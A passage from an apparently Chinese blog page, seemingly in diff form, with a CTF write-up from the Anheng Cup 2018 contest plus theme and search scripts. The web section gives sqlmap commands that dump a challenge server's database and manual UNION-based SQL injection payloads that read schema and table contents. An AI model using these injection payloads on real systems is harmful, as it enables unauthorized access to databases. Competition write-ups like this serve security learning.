class="line">D:\www\test&gt;type &quot;index.php&lt;&lt;&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br></pre></td></tr></table></figure>
+<p>于是把php改为phP，就可以注入了</p>
+<p>先上sqlmap</p>
+<p>获取数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --dbs -p id --thread 10</span><br></pre></td></tr></table></figure>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969664379.png" alt="1526969664379"></p>
+<p>拿到当前数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin <span class="comment">--flush -p id --thread 10 --current-db</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969882637.png" alt="1526969882637"></p>
+<p>获得表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb --tables</span><br></pre></td></tr></table></figure>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970077793.png" alt="1526970077793"></p>
+<p>拿到表里面的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb -T article --dump</span><br></pre></td></tr></table></figure>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970228303.png" alt="1526970228303"></p>
+<p>尝试手动注入一波</p>
+<p>单引号没反应</p>
+<p>双引号报错了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &apos;Exception&apos; with message &apos;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&apos; at line 1 query: select * from article where title =&quot;admin&quot; &quot;&apos; in E:\apache2\htdocs\MysqliDb.php:1926 Stack trace: #0 E:\apache2\htdocs\MysqliDb.php(516): MysqliDb-&gt;_prepareQuery() #1 E:\apache2\htdocs\MysqliDb.php(550): MysqliDb-&gt;rawQuery(&apos;select * from a...&apos;, NULL) #2 E:\apache2\htdocs\json.php(39): MysqliDb-&gt;rawQueryOne(&apos;select * from a...&apos;) #3 &#123;main&#125; thrown in E:\apache2\htdocs\MysqliDb.php on line 1926</span><br></pre></td></tr></table></figure>
+<p>发现这一句，要用双引号闭合</p>
+<blockquote>
+<p>select * from article where title =”admin” “‘ in </p>
+</blockquote>
+<p>order by 判断一下，4的时候错误，那就说明表有三列</p>
+<blockquote>
+<p>id=admin” order by 3%23</p>
+</blockquote>
+<p>把admin随便换一个，这样前面没有数据就会把union select的值输出，这里发现把1和2输出</p>
+<blockquote>
+<p>id=-“ union select 1,2,3%23</p>
+</blockquote>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971766987.png" alt="1526971766987"></p>
+<p>获得数据库 5monthweb</p>
+<blockquote>
+<p>id=-“ union select user(),database(),3%23</p>
+</blockquote>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971888625.png" alt="1526971888625"></p>
+<p>获得表名 article </p>
+<blockquote>
+<p>id=-“ union select user(),table_name,3 from information_schema.tables where table_schema = database()%23</p>
+</blockquote>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972049073.png" alt="1526972049073"></p>
+<p>获得列名 id,title,content </p>
+<blockquote>
+<p>id=-“ union select user(),group_concat(column_name),3 from information_schema.columns where table_schema = database()%23</p>
+</blockquote>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972166936.png" alt="1526972166936"></p>
+<p>得表里面的数据</p>
+<blockquote>
+<p>id=-“ union select user(),concat_ws(char(32,58,32),id,title,content),3 from 5monthweb.article %23</p>
+</blockquote>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972278977.png" alt="1526972278977"></p>
+<blockquote>
+<p>flag{you_are_admin}</p>
+</blockquote>
+<p>附上安恒杯月赛讲解视频链接</p>
+<blockquote>
+<p>直播地址：<a href="http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024" target="_blank" rel="noopener">http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024</a> </p>
+<p>解题讲师：你们最最熟悉的xsser老师 </p>
+</blockquote>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="wifi密码是多少"><a href="#wifi密码是多少" class="headerlink" title="wifi密码是多少"></a>wifi密码是多少</h2><blockquote>
+<p>你猜猜 咱们的wifi密码是多少？ 你懂操作系统吗 哈哈哈哈  </p>
+</blockquote>
+<p>文件：5afea37acccbc.bin</p>
+<p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526805894626.png" alt="1526805894626"></p>
+<blockquote>
+<p>flag{Y0ung_m4n_u_are_s0_coo1!}</p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/20/CSP学习笔记/" rel="next" title="CSP学习笔记">
+                <i class="fa fa-chevron-left"></i> CSP学习笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Lhaihai" />
+            
+              <p class="site-author-name" itemprop="name">Lhaihai</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/TheReturnOfTheKing/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#奇怪的恐龙特性"><span class="nav-number">1.1.</span> <span class="nav-text">奇怪的恐龙特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不能注册的admin"><span class="nav-number">1.2.</span> <span class="nav-text">不能注册的admin</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wifi密码是多少"><span class="nav-number">2.1.</span> <span class="nav-text">wifi密码是多少</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-117483741-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-117483741-1');
+</script>
+
+<div class="copyright">&copy; 2018/3/11 &mdash; <span itemprop="copyrightYear">2018</span>
+
+		
+
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lhaihai</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye">本站总访问量</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
